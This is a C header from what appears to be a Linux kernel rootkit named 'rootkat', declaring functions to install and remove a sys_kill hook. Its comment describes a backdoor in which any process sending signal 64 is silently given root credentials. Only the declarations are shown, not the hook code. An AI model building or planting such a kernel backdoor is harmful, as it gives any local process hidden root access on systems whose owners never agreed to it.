/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_SYS_KILL_H
#define ROOTKAT_HOOK_SYS_KILL_H

/*
 * sys_kill hook — implements the magic-signal privesc backdoor.
 * Any process sending signal ROOTKAT_MAGIC_SIG (64 / SIGRTMAX) via kill()
 * has its credentials elevated to root. The signal is swallowed (kill
 * returns 0 without delivering it).
 */
#define ROOTKAT_MAGIC_SIG 64

int rootkat_hook_sys_kill_install(void);
void rootkat_hook_sys_kill_remove(void);

#endif
